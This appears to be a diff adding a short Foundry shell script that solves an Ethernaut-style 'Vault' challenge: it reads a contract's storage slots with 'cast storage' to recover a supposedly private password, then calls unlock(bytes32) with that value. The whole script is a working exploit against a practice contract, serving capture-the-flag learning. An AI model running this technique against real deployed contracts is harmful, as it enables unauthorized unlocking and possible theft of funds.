@@ -1,0 +1,15 @@
+source ~/ethernauts/.env
+
+cast storage 0x5e2bFF238B120FD277795A592c2360D8a5C597eF --rpc-url $RPC_URL 0
+
+cast storage 0x5e2bFF238B120FD277795A592c2360D8a5C597eF --rpc-url $RPC_URL 1
+
+cast storage 0x5e2bFF238B120FD277795A592c2360D8a5C597eF --rpc-url $RPC_URL 2
+
+
+cast send \
+    --rpc-url $RPC_URL \
+    --private-key $PRIVATE_KEY \
+    0x5e2bFF238B120FD277795A592c2360D8a5C597eF \
+    "unlock(bytes32)()" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+
